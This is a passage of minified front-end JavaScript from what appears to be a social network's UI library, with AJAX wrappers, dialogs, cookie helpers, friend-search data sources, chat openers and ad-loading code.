XN.net.xmlhttp.prototype.getTransport=function(w){
if(w!==window){
return w.getTransport();
}
try{
return new ActiveXObject("Msxml2.XMLHTTP");
}
catch(e){
return new ActiveXObject("Microsoft.XMLHTTP");
}
};
}else{
XN.net.xmlhttp.prototype.getTransport=function(w){
if(w!==window){
return w.getTransport();
}
return new XMLHttpRequest();
};
}
XN.NET=XN.Net=XN.net;
XN.net.ajax=XN.net.xmlhttp;
$extend(XN.net.xmlhttp.prototype,{get:function(url,data,_14e,_14f){
this.url=url;
this.data=data;
this.onSuccess=_14e;
$extend(this,_14f);
this.send("get");
},post:function(url,data,_152,_153){
this.url=url;
this.data=data;
this.onSuccess=_152;
$extend(this,_153);
this.send("post");
}});
if(typeof Ajax=="undefined"){
Ajax={};
Ajax.Request=function(url,o){
var p=o.parameters;
o["url"]=url;
o["data"]=p;
delete o.parameters;
return new XN.net.xmlhttp(o);
};
}
XN.template={};
XN.template.mediaPlayer=function(o){
return ["<object classid=\"CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95\" width=\""+(o.width||"352")+"\" height=\""+(o.height||"70")+"\" >\n","<param name=\"autostart\" value=\""+(o.autostart||"1")+"\" >\n","<param name=\"showstatusbar\" value=\""+(o.showstatusbar||"1")+"\">\n","<param name=\"filename\" value=\""+o.filename+"\">\n","<embed type=\"application/x-oleobject\" codebase=\"http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701\" ","flename=\"mp\"","autostart=\""+(o.autostart||"1")+"\" showstatusbar=\""+(o.showstatusbar||"1")+"\" ","src=\""+o.filename+"\" width=\""+(o.width||"352")+"\" height=\""+(o.height||"70")+"\"></embed>"].join("");
};
XN.template.flashPlayer=function(o){
return "<embed src=\""+XN.ENV.staticRoot+"/swf/player.swf?url="+o.filename+"&Rwid="+(o.width||"450")+"&Autoplay="+(o.autostart||"1")+"\" wmode=\""+(o.wmode||"transparent")+"\" loop=\"false\" menu=\"false\" quality=\"high\" scale=\"noscale\" salign=\"lt\" bgcolor=\"#ffffff\" width=\""+(o.width||"450")+"\" height=\""+(o.height||"30")+"\" align=\"middle\" allowScriptAccess=\""+(o.allowScriptAccess||"sameDomain")+"\" allowFullScreen=\"false\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" />";
};
XN.template.flash=function(o){
return "&nbsp;<embed src=\""+o.filename+"\" type=\"application/x-shockwave-flash\" "+"width=\""+(o.width||"320")+"\" height=\""+(o.height||"240")+"\" allowFullScreen=\"true\" wmode=\""+(o.wmode||"transparent")+"\" allowNetworking=\""+(o.allowNetworking||"all")+"\" allowScriptAccess=\""+(o.allowScriptAccess||"sameDomain")+"\"></embed>";
};
XN.Template=XN.TEMPLATE=XN.template;
XN.namespace("util");
XN.util.cache=function(_15a){
$extend(this,_15a);
this._cacheData=[];
};
XN.util.cache.prototype={cacheLength:null,_cacheData:null,isExist:function(key){
return this.get(key);
},add:function(key,_15d){
if(!isUndefined(this.isExist(key))){
return;
}
if(this.cacheLength&&this.cacheLength==this._cacheData.length){
this._cacheData.shift();
}
this._cacheData.push({"key":key,"value":_15d});
},get:function(key){
for(var i=this._cacheData.length-1;i>=0;i--){
if(this._cacheData[i].key==key){
return this._cacheData[i].value;
}
}
},clear:function(){
this._cacheData=[];
}};
XN.UTIL=XN.Util=XN.util;
XN.util.DS_JSON=function(p){
$extend(this,p);
};
XN.util.DS_JSON.prototype={DS_TYPE:"JSON",url:null,queryParam:"query",attachParam:"",rootKey:null,method:"get",_request:null,query:function(v,_162){
var This=this;
try{
this._request.abort();
}
catch(e){
}
function parseDS_JSON(r){
r=r.responseText;
var pp;
try{
var rt=XN.JSON.parse(r);
if(This.rootKey&&rt[This.rootKey]){
pp=rt[This.rootKey];
}else{
pp=rt;
}
}
catch(e){
pp=[];
}
_162(pp);
}
this._request=new XN.net.xmlhttp({url:this.url,data:this.queryParam+"="+encodeURIComponent(v)+"&"+this.attachParam,method:this.method,onSuccess:parseDS_JSON});
}};
XN.ui.DS_JSON=XN.util.DS_JSON;
XN.util.DS_friends=function(p){
var ds=new XN.util.DS_JSON(p);
ds.queryParam="p";
ds.rootKey="candidate";
ds.net="";
ds.group="";
ds.page=isUndefined(p.page)?false:p.page;
ds.param=XN.json.build(p.param||{});
var _169=isUndefined(p.limit)?24:p.limit;
ds.query=function(name,_16b){
XN.log("start query");
name=name.replace(/[^a-zA-Z\u0391-\uFFE5]/g,"");
if(XN.string.isBlank(name)&&this.group==""&&this.net==""){
_16b([]);
return;
}
var p=["{\"init\":false,","\"qkey\":\""+this.qkey+"\",","\"uid\":true,","\"uname\":true,","\"uhead\":true,","\"limit\":"+_169+",","\"param\":"+this.param+",","\"query\":\""+name+"\",","\"group\":\""+this.group+"\",","\"net\":\""+this.net+"\",","\"page\":\""+this.page+"\"","}"].join("");
XN.util.DS_JSON.prototype.query.call(this,p,_16b);
};
return ds;
};
XN.ui.DS_friends=XN.util.DS_friends;
XN.util.DS_Array=function(p){
$extend(this,p);
this.init();
};
XN.util.DS_Array.prototype={DS_TYPE:"array",data:null,searchKey:null,init:function(){
var key=this.searchKey,_16f=this._index=[];
XN.array.each(this.data,function(i,v){
_16f.push(v[key]);
});
},query:function(v,_173){
_173(this._search(v));
},_search:function(v){
var keys=this._index,data=this.data,rt=[],reg=new RegExp("^"+v,"i");
XN.array.each(keys,function(i,v){
if(reg.test(v)){
rt.push(data[i]);
}
});
return rt;
}};
XN.ui.DS_Array=XN.util.DS_Array;
XN.util.DS_XHR=function(p){
$extend(this,p);
};
XN.util.DS_XHR.prototype={url:null,queryParam:"query",_request:null,query:function(v,_17d){
var This=this;
try{
this._request.abort();
}
catch(e){
}
function parseDS_XML(r){
r=r.responseXML;
var rt=[];
function getResult(r){
var tmp={};
XN.array.each(r.childNodes,function(i,v){
tmp[v.tagName.toLowerCase()]=v.firstChild.nodeValue;
});
return tmp;
}
try{
var rs=r.getElementsByTagName("Result");
XN.array.each(rs,function(i,v){
rt.push(getResult(v));
});
}
catch(e){
rt=[];
}
_17d(rt);
}
this._request=new XN.net.xmlhttp({url:this.url,data:this.queryParam+"="+encodeURIComponent(v),onSuccess:parseDS_XML});
}};
XN.ui.DS_XHR=XN.util.DS_XHR;
(function(){
var _188={};
XN.util.hotKey={add:function(key,func,obj){
key=String(key).toLowerCase();
var ctrl=false;
var alt=false;
var _18e=false;
var _18f=null;
if(/^\d+$/.test(key)){
_18f=parseInt(key);
}else{
ctrl=/ctrl|ctr|c/.test(key);
alt=/alt|a/.test(key);
_18e=/shift|s/.test(key);
if(/\d+/.test(key)){
_18f=parseInt(/\d+/.exec(key)[0]);
}else{
_18f=false;
}
}
_188[key]=_188[key]||{};
_188[key][func]=function(e){
e=e||window.event;
code=e.keyCode;
if(ctrl&&!e.ctrlKey){
return;
}
if(alt&&!e.altKey){
return;
}
if(_18e&&!e.shiftKey){
return;
}
if(_18f&&code!==_18f){
return;
}
func.call(obj||null);
XN.event.stop(e);
};
XN.event.addEvent(document,"keydown",_188[key][func]);
},del:function(key,func){
key=String(key).toLowerCase();
XN.event.delEvent(document,"keydown",_188[key][func]);
delete _188[key][func];
}};
})();
(function(){
var id=0;
XN.util.createObjID=function(){
id++;
return id;
};
})();
XN.DO=XN.Do={};
(function(){
var _194=null;
var _195=null;
XN.DO.alert=function(_196,_197,type,X,Y,w,h,_19d){
try{
_194.remove();
}
catch(e){
}
var _19e={type:"normal",width:400,button:"\u786e\u5b9a",callBack:XN.func.empty,autoHide:0,params:{addIframe:true}};
if(!isString(_196)){
$extend(_19e,_196);
}
if(isString(_196)||arguments.length>1){
var ars=arguments;
XN.array.each(["message","title","type","X","Y","width","height","callBack"],function(i,v){
if(ars[i]){
_19e[v]=ars[i];
}
});
}
var _1a2=new XN.ui.dialog(_19e.params).setType(_19e.type).setTitle(_19e.title||(_19e.type=="error"?"\u9519\u8bef\u63d0\u793a":"\u63d0\u793a")).setBody(_19e.msg||_19e.message||"").setWidth(_19e.width).setHeight(_19e.height).setX(_19e.X).setY(_19e.Y).addButton({text:(_19e.yes||_19e.button),onclick:function(){
_1a2.setAutoHide(true);
return true;
}}).show();
_1a2.addEvent("hide",function(){
_19e.callBack.call(_1a2);
});
_194=_1a2;
if(_19e.noFooter){
_1a2.footer.hide();
}
if(_19e.noHeader){
_1a2.header.hide();
}
try{
_1a2.getButton(_19e.button).focus();
}
catch(e){
}
if(_19e.autoHide){
_1a2.autoHide(_19e.autoHide);
}
return _1a2;
};
var _1a3=null;
XN.DO.confirm=function(_1a4,_1a5,_1a6,yes,no,X,Y,w,h){
try{
_1a3.remove();
}
catch(e){
}
var _1ad={type:"normal",width:400,yes:"\u786e\u5b9a",no:"\u53d6\u6d88",callBack:XN.func.empty,focus:null,params:{addIframe:true}};
if(!isString(_1a4)){
$extend(_1ad,_1a4);
}
if(isString(_1a4)||arguments.length>1){
var ars=arguments;
XN.array.each(["message","title","callBack","yes","no","X","Y","w","h"],function(i,v){
if(ars[i]){
_1ad[v]=ars[i];
}
});
}
var _1b1=new XN.ui.dialog(_1ad.params).setType(_1ad.type).setTitle(_1ad.title||(_1ad.type=="error"?"\u9519\u8bef\u63d0\u793a":"\u63d0\u793a")).setBody(_1ad.msg||_1ad.message||"").setWidth(_1ad.width).setHeight(_1ad.height).setX(_1ad.X).setY(_1ad.Y).addButton({text:(_1ad.submit||_1ad.yes),onclick:function(){
_1b1.setAutoHide(true);
return _1ad.callBack.call(_1b1,true);
}}).addButton({text:(_1ad.cancel||_1ad.no),onclick:function(){
_1b1.setAutoHide(true);
return _1ad.callBack.call(_1b1,false);
}}).show();
_1b1.getButton(_1ad.cancel||_1ad.no).addClass("gray");
if(_1ad.focus=="submit"){
_1ad.focus=_1ad.submit;
}else{
if(_1ad.focus=="cancel"){
_1ad.focus=_1ad.cancel;
}
}
_1b1.getButton(_1ad.focus||_1ad.submit||_1ad.yes).focus();
_1a3=_1b1;
return _1b1;
};
XN.DO.showMessage=XN.DO.showMsg=function(msg,_1b3,time){
var _1b5=XN.DO.alert({msg:msg,title:(_1b3||"\u63d0\u793a"),noFooter:true,autoHide:(time||2)});
return _1b5;
};
XN.DO.showError=function(msg,_1b7,time){
var _1b9=XN.DO.alert({msg:msg,type:"error",title:(_1b7||"\u9519\u8bef\u63d0\u793a"),noFooter:true,autoHide:(time||2)});
return _1b9;
};
})();
XN.json={_ESCAPES:/\\["\\\/bfnrtu]/g,_VALUES:/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,_BRACKETS:/(?:^|:|,)(?:\s*\[)+/g,_INVALID:/^[\],:{}\s]*$/,_SPECIAL_CHARS:/["\\\x00-\x1f\x7f-\x9f]/g,_PARSE_DATE:/^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})Z$/,_CHARS:{"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r","\"":"\\\"","\\":"\\\\"},dateToString:function(d){
function _zeroPad(v){
return v<10?"0"+v:v;
}
return "\""+d.getUTCFullYear()+"-"+_zeroPad(d.getUTCMonth()+1)+"-"+_zeroPad(d.getUTCDate())+"T"+_zeroPad(d.getUTCHours())+":"+_zeroPad(d.getUTCMinutes())+":"+_zeroPad(d.getUTCSeconds())+"Z\"";
},stringToDate:function(str){
if(XN.JSON._PARSE_DATE.test(str)){
var d=new Date();
d.setUTCFullYear(RegExp.$1,(RegExp.$2|0)-1,RegExp.$3);
d.setUTCHours(RegExp.$4,RegExp.$5,RegExp.$6);
return d;
}
},parse:function(str){
return eval("("+str+")");
},build:function(o,w,d){
var m=XN.JSON._CHARS,_1c3=XN.JSON._SPECIAL_CHARS,_1c4=[];
var _1c5=function(c){
if(!m[c]){
var a=c.charCodeAt();
m[c]="\\u00"+Math.floor(a/16).toString(16)+(a%16).toString(16);
}
return m[c];
};
var _1c8=function(s){
return "\""+s.replace(_1c3,_1c5)+"\"";
};
var _1ca=XN.JSON.dateToString;
var _1cb=function(o,w,d){
var t=typeof o,i,len,j,k,v,vt,a;
if(t==="string"){
return _1c8(o);
}
if(t==="boolean"||o instanceof Boolean){
return String(o);
}
if(t==="number"||o instanceof Number){
return isFinite(o)?String(o):"null";
}
if(o instanceof Date){
return _1ca(o);
}
if(isArray(o)){
for(i=_1c4.length-1;i>=0;--i){
if(_1c4[i]===o){
return "null";
}
}
_1c4[_1c4.length]=o;
a=[];
if(d>0){
for(i=o.length-1;i>=0;--i){
a[i]=_1cb(o[i],w,d-1)||"null";
}
}
_1c4.pop();
return "["+a.join(",")+"]";
}
if(t==="object"){
if(!o){
return "null";
}
for(i=_1c4.length-1;i>=0;--i){
if(_1c4[i]===o){
return "null";
}
}
_1c4[_1c4.length]=o;
a=[];
if(d>0){
if(w){
for(i=0,j=0,len=w.length;i<len;++i){
if(typeof w[i]==="string"){
v=_1cb(o[w[i]],w,d-1);
if(v){
a[j++]=_1c8(w[i])+":"+v;
}
}
}
}else{
j=0;
for(k in o){
if(typeof k==="string"&&typeof o[k]!="undefined"){
v=_1cb(o[k],w,d-1);
if(v){
a[j++]=_1c8(k)+":"+v;
}
}
}
}
}
_1c4.pop();
return "{"+a.join(",")+"}";
}
return undefined;
};
d=d>=0?d:1/0;
return _1cb(o,w,d);
}};
XN.JSON=XN.Json=XN.json;
(function(){
writepipe=function(uin,nick){
if(uin>0){
var s=GetCookie("_pipe");
if(s){
s+=":";
}
SetCookie("_pipe",s+uin+":"+escape(nick),null,"/",""+XN.env.domain+"");
}
var _1da=GetCookie("_wi");
if("opening"==_1da){
}else{
if("running"==_1da){
}else{
SetCookie("_wi","opening",null,"/",XN.ENV.domain);
window.wiw=window.open("http://"+XN.env.domain+"/webpager.do?toid="+uin,"_blank","height=600,width=650,resizable=yes,location=yes");
if(window.wiw_checker){
window.clearInterval(window.wiw_checker);
}
window.wiw_checker=window.setInterval(function(){
if(window.wiw.closed){
window.clearInterval(window.wiw_checker);
SetCookie("_wi","",null,"/",XN.ENV.domain);
}
},1000);
return true;
}
}
try{
if(window.wiw){
window.wiw.focus();
}
}
catch(e){
}
return false;
};
talkto=function(uin,nick,tiny,_1de){
try{
var a=new ActiveXObject("xntalk.Application");
if(a){
a.openChat("",uin);
return true;
}
}
catch(e){
}
if(top.frames["imengine"].gPagerType==4){
if(top.frames["imengine"].imHelper.isLoginUser()){
var tabs=top.frames["imengine"].imui.chatTabs;
tabs.onActivateWidget(uin,nick,tiny,_1de);
tabs.switchFocus(uin);
return true;
}
}
try{
writepipe(uin,nick);
}
catch(e){
}
};
jump_and_download=function(link){
if(XN.BROWSER.IE){
window.open(link,"download_window","toolbar=0,location=no,directories=0,status=0,scrollbars=0,resizeable=0,width=1,height=1,top=0,left=0");
window.focus();
}
};
})();
function GetCookieVal(_70){
var _71=document.cookie.indexOf(";",_70);
if(_71==-1){
_71=document.cookie.length;
}
return unescape(document.cookie.substring(_70,_71));
}
function GetCookie(_72){
var arg=_72+"=";
var _74=arg.length;
var _75=document.cookie.length;
var i=0;
while(i<_75){
var j=i+_74;
if(document.cookie.substring(i,j)==arg){
return GetCookieVal(j);
}
i=document.cookie.indexOf(" ",i)+1;
if(i==0){
break;
}
}
return null;
}
function SetCookie(_78,_79){
var _7a=SetCookie.arguments;
var _7b=SetCookie.arguments.length;
var _7c=(_7b>2)?_7a[2]:null;
var _7d=(_7b>3)?_7a[3]:null;
var _7e=(_7b>4)?_7a[4]:null;
var _7f=(_7b>5)?_7a[5]:false;
document.cookie=_78+"="+escape(_79)+((_7c==null)?"":("; expires="+_7c.toGMTString()))+((_7d==null)?"":("; path="+_7d))+((_7e==null)?"":("; domain="+_7e))+((_7f==true)?"; secure":"");
}
var IMHack={};
(function(){
function css(ele,prop){
for(i in prop){
ele.style[i]=prop[i];
}
}
function getElementsByClass(_1f4,_1f5){
return XN.DOM.getElementsByClassName(_1f5,_1f4);
}
var _1f6=null;
var _1f7=null;
var _1f8=function(){
css(_1f6,{visibility:"hidden"});
clearTimeout(_1f7);
_1f7=setTimeout(function(){
css(_1f6,{visibility:"visible"});
_1f6.className=_1f6.className;
},500);
};
IMHack.hackToolBar=function(){
_1f6=document.getElementById("wpiroot");
css(_1f6,{position:"absolute",right:0});
$(window).addEvent("scroll",_1f8).addEvent("resize",_1f8);
};
IMHack.hackWidget=function(ele){
var _1fa=ele.getElementsByTagName("div")[0];
css(_1fa,{position:"absolute",bottom:"23px"});
if(getElementsByClass(ele,"buddy-list").length>0){
css(_1fa,{right:"-62px"});
}else{
if(getElementsByClass(ele,"notifications").length>0){
css(_1fa,{right:"-31px"});
}else{
if(getElementsByClass(ele,"status-control").length>0){
css(_1fa,{right:"-1px"});
}else{
if((/\bm-chat-button-chattab\b/.test(ele.className))){
css(ele,{position:"relative"});
css(getElementsByClass(ele,"m-chat-window")[0],{position:"absolute",right:"-2px",bottom:"23px"});
}else{
css(_1fa,{right:0});
}
}
}
}
};
})();
if(XN.browser.Gecko){
if(XN.string.getQuery("debug_mode")){
XN.debug.on();
}
}
(function(){
var _1fb=false;
window.render_jebe_ads=function(j){
if(!window.ad_js_version){
return;
}
XN.loadFile("http://jebe.xnimg.cn/"+ad_js_version+"/render.js",function(){
render_jebe_ads_load(j);
});
};
window.load_jebe_ads=function(s,r,_1ff){
if(!s){
return;
}
if(_1fb&&!_1ff){
return;
}
_1fb=true;
XN.dom.ready(function(){
var p=XN.cookie.get("id");
if(!p||XN.string.isBlank(p)){
p="";
}
var src="http://shaft.jebe.renren.com/show?userid="+encodeURIComponent(p)+"&tt="+new Date().getTime();
if(r){
src+="&r="+r;
}
if(_1ff&&location.pathname.toLowerCase()!="/home.do"){
src+="&reflush_new=1";
}
XN.loadFile({file:src,type:"js"});
});
};
})();
XN.USER=XN.user={};
XN.USER.me=function(_202){
};
currentUser={};
XN.event.enableCustomEvent(currentUser);
XN.USER.addFriendAction=function(p){
this.config={commentLength:45,needComment:true,requestURI:"http://friend."+XN.env.domain+"/ajax_request_friend.do"};
$extend(this.config,p);
};
XN.user.addFriendAction.prototype={getConfig:function(key){
return this.config[key];
},send:function(id,why,from,code,_209){
var code=code!=1?0:1;
var _209=_209||"";
var This=this;
if(this.getConfig("needComment")){
if(XN.STRING.isBlank(why)){
this.fireEvent("checkError","\u60a8\u8f93\u5165\u7684\u4fe1\u606f\u4e0d\u80fd\u4e3a\u7a7a");
return;
}
}
if(why.length>this.getConfig("commentLength")){
this.fireEvent("checkError","\u60a8\u8f93\u5165\u7684\u4fe1\u606f\u4e0d\u80fd\u8d85\u8fc7"+this.getConfig("commentLength")+"\u4e2a\u5b57\u7b26");
return;
}
var data="id="+id+"&why="+why+"&codeFlag="+code+"&code="+_209;
this.fireEvent("beforePost");
new XN.NET.xmlhttp({url:this.getConfig("requestURI")+"?from="+from,"data":data,onSuccess:function(r){
r=r.responseText;
if(isJSON(r)){
var re=XN.JSON.parse(r);
}else{
re={result:-1};
}
if(re.result=="-1"){
This.fireEvent("flagError");
return;
}
This.fireEvent("success",id,r,from);
if(!window.currentUser){
return;
}
if(currentUser.fireEvent){
currentUser.fireEvent("addFriendSuccess",id,r,from);
}
if(currentUser.onaddFriendSuccess){
currentUser.onaddFriendSuccess(id,r);
}
},onError:function(){
This.fireEvent("error",id,from);
if(!window.currentUser){
return;
}
currentUser.fireEvent("addFriendError",id,r,from);
}});
}};
XN.EVENT.enableCustomEvent(XN.USER.addFriendAction.prototype);
XN.dynamicLoad({file:"http://s.xnimg.cn/jspro/xn.app.addFriend.js",funcs:["showRequestFriendDialog"]});
(function(){
if(!XN.browser.IE){
return;
}
var _20e="";
XN.dom.ready(function(){
_20e=document.getElementsByTagName("title")[0].innerHTML;
});
XN.event.addEvent(window,"load",function(){
setTimeout(function(){
document.title=_20e;
},1000);
});
})();
XN.namespace("ui");
(function(){
XN.ui.element={frame:null,iAmUIelement:true};
XN.array.each(["addClass","delClass","show","hide","remove"],function(i,v){
XN.ui.element[v]=function(){
XN.element[v].apply(null,[this.frame].concat(XN.array.build(arguments)));
};
});
XN.ui.container={container:null};
XN.array.each(["addChild","delChild","setContent"],function(i,v){
XN.ui.container[v]=function(){
XN.element[v].apply(null,[this.container].concat(XN.array.build(arguments)));
};
});
$extend(XN.ui.container,XN.ui.element);
})();
XN.UI=XN.Ui=XN.ui;
XN.ui.Element=XN.ui.element;
XN.ui.Content=XN.ui.container;
(function(ns){
var UI=XN.ui;
var _215=XN.event.addEvent;
var _216=true;
function log(s){
if(_216){
XN.log(isString(s)?"xn.ui.button:"+s:s);
}
}
ns.button=function(_218){
$extend(this,_218);
this.init();
};
ns.button.prototype=$extend({},UI.Element);
ns.button.prototype.text=null;
ns.button.prototype.className="";
ns.button.prototype.disableClassName="gray";
ns.button.prototype.init=function(){
var This=this;
var el;
if(this.getConfig("el")){
el=$(this.getConfig("el"));
}else{
el=$element("input");
}
this.frame=el;
el.type="button";
this.addClass("input-submit");
this.addClass(this.getConfig("className"));
this.setText(this.getConfig("text"));
_215(el,"click",function(){
if(This.onclick){
This.onclick();
}
},false);
};
ns.button.prototype.getConfig=function(key){
if(key=="el"){
return this.id;
}
return this[key];
};
ns.button.prototype.getEl=function(){
return this.frame;
};
ns.button.prototype.setText=function(text){
this.text=text;
this.getEl().value=text;
};
ns.button.prototype.disable=function(){
var el=this.getEl();
el.blur();
el.disabled=true;
el.addClass(this.getConfig("disableClassName"));
};
ns.button.prototype.enable=function(){
var el=this.getEl();
el.disabled=false;
el.delClass(this.getConfig("disableClassName"));
};
ns.button.prototype.focus=function(){
this.getEl().focus();
};
ns.button.prototype.blur=function(){
this.getEl().blur();
};
})(XN.ui);
(function(){
var rl="realLeft",rt="realTop",ow="offsetWidth",oh="offsetHeight";
XN.ui.fixPositionMethods={"1-1":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+"px";
f.style.top=y+el[rt]()-p[rt]()+"px";
},"1-2":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+"px";
},"1-3":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()-f[oh]+"px";
},"1-4":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+"px";
f.style.top=y+el[rt]()-p[rt]()-f[oh]+"px";
},"2-1":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+"px";
},"2-2":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+"px";
},"2-3":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()-f[oh]+"px";
},"2-4":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()-f[oh]+"px";
},"3-1":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]+"px";
},"3-2":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]-f[ow]+"px";
f.style.top=y+el[rt]()+el[oh]+"px";
},"3-3":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]-f[oh]+"px";
},"3-4":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+el[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]-f[oh]+"px";
},"4-1":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]+"px";
},"4-2":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]+"px";
},"4-3":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()-f[ow]+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]-f[oh]+"px";
},"4-4":function(f,el,x,y,p){
f.style.left=x+el[rl]()-p[rl]()+"px";
f.style.top=y+el[rt]()-p[rt]()+el[oh]-f[oh]+"px";
}};
})();
XN.ui.fixPositionElement=function(_273){
var This=this;
this.config={tagName:"div",useIframeInIE6:true};
$extend(this.config,_273);
var f,x,y;
if(this.getConfig("id")){
this.frame=f=$(this.getConfig("id"));
x=f.realLeft();
y=f.realTop();
}else{
if(this.getConfig("tagName")){
this.frame=this.container=f=$element(this.getConfig("tagName"));
}else{
return;
}
}
this.container=$element("div");
this.frame.appendChild(this.container);
XN.array.each(["alignWith","alignType","offsetX","offsetY","alignParent"],function(i,v){
This[v]=This.getConfig(v)||This[v];
});
XN.element.setStyle(f,"position:absolute;z-index:10001;left:-9999px;top:-9999px");
if(!$(this.alignParent)){
this.alignParent=$(document.body);
}
$(this.alignParent).appendChild(this.frame);
if((XN.browser.IE6&&this.getConfig("useIframeInIE6"))||this.getConfig("addIframe")){
var _27a;
this._iframe=_27a=$element("iframe");
_27a.frameBorder=0;
_27a.scrolling="no";
_27a.setStyle("position:absolute;border:0px;left:0px;top:0px;z-index:-1;");
if(XN.browser.Gecko){
_27a.setAttribute("style","position:absolute;border:0px;left:0px;top:0px;z-index:-1;");
}
if(XN.browser.IE){
_27a.style.filter="progid:DXImageTransform.Microsoft.Alpha(style=0,opacity=0)";
}
this.frame.appendChild(_27a);
}
if(XN.element.visible(f)){
this.show();
}
f.style.display="block";
};
XN.ui.fixPositionElement.prototype=$extend({},XN.ui.container);
$extend(XN.ui.fixPositionElement.prototype,{alignWith:null,alignType:"4-1",offsetX:0,offsetY:0,alignParent:"dropmenuHolder",left:null,top:null,_isShow:false,getConfig:function(key){
return this.config[key];
},setOffsetX:function(x){
this.offsetX=x;
this.refresh();
return this;
},setOffsetY:function(y){
this.offsetY=y;
this.refresh();
return this;
},setAlignType:function(t){
this.alignType=t;
this.refresh();
return this;
},setAlignParent:function(p){
this.alignParent=p;
$(this.alignParent).appendChild(this.frame);
this.refresh();
return this;
},refresh:function(){
if(this.visible()){
this.show();
}else{
this.hide();
}
return this;
},visible:function(){
return this._isShow;
},show:function(){
this._isShow=true;
this.frame.show();
if(this.alignWith){
this._moveToElement(this.alignWith);
}else{
var x=this.left===null?parseInt((($(this.alignParent).offsetWidth-this.frame.offsetWidth)/2),10):this.left;
var y=this.top===null?XN.event.scrollTop()+200:this.top;
this._moveToPosition(x,y);
}
if(this._iframe){
try{
this._iframe.style.height=this.frame.offsetHeight-2+"px";
this._iframe.style.width=this.frame.offsetWidth+"px";
}
catch(e){
}
}
return this;
},hide:function(){
this._isShow=false;
var f=this.frame;
f.style.left="-9999px";
f.style.top="-9999px";
return this;
},moveTo:function(x,y){
if(!x&&!y){
return;
}
if(isNumber(x)){
this.left=x;
this.alignWith=null;
}else{
if(isString(x)||isElement(x)){
this.alignWith=$(x);
}
}
if(isNumber(y)){
this.top=y;
this.alignWith=null;
}
this.refresh();
return this;
},setX:function(x){
this.moveTo(x);
return this;
},setY:function(y){
this.moveTo(null,y);
return this;
},setIndex:function(i){
this.frame.style.zIndex=i;
return this;
},_moveToElement:function(el){
XN.ui.fixPositionMethods[this.alignType](this.frame,$(el),this.offsetX,this.offsetY,$(this.alignParent));
},_moveToPosition:function(x,y){
if(x){
this.frame.style.left=x+"px";
}
if(y){
this.frame.style.top=y+"px";
}
}});
(function(){
var _28b=XN.ui.fixPositionElement.prototype;
var _28c=XN.event;
XN.ui.dialog=function(_28d){
var This=this;
XN.ui.fixPositionElement.call(this,_28d);
this.container=$element("div");
this.frame.appendChild(this.container);
if(this.getConfig("HTML")){
this.setContent(this.getConfig("HTML"));
}else{
this.setContent(this.buildHTML());
}
this.dialogContainer=$("ui_dialog_container");
this.header=$("ui_dialog_header");
this.body=$("ui_dialog_body");
this.footer=$("ui_dialog_footer");
this.closeButton=$("ui_dialog_close");
this.header.addChild=this.body.addChild=this.footer.addChild=function(s){
XN.element.addChild(this,s);
setTimeout(function(){
This.refresh();
},0);
};
this.dialogContainer.removeAttribute("id");
this.header.removeAttribute("id");
this.body.removeAttribute("id");
this.footer.removeAttribute("id");
this.closeButton.removeAttribute("id");
if(this.getConfig("showCloseButton")){
this.closeButton.show();
XN.event.addEvent(this.closeButton,"click",function(){
This.hide();
});
}
this.frame.style.zIndex=10000;
this.setWidth(this.getConfig("width")||400);
if(this.getConfig("height")){
this.setHeight(this.getConfig("height"));
}
XN.array.each(["header","body","footer"],function(i,v){
if(This.getConfig(v)){
This[v].setContent(This.getConfig(v));
}
});
if(this.getConfig("type")){
this.setType(this.getConfig("type"));
}
this._buttons=[];
XN.event.addEvent(this.footer,"click",function(e){
e=e||window.event;
This._parseButtonEvent(e);
});
XN.util.hotKey.add("27",this._hotKeyEvent,this);
if(this.getConfig("modal")){
XN.dom.disable();
}
};
XN.ui.dialog.prototype=$extend({},_28b);
$extend(XN.ui.dialog.prototype,{header:null,body:null,footer:null,_iframe:null,_buttons:null,buildHTML:function(){
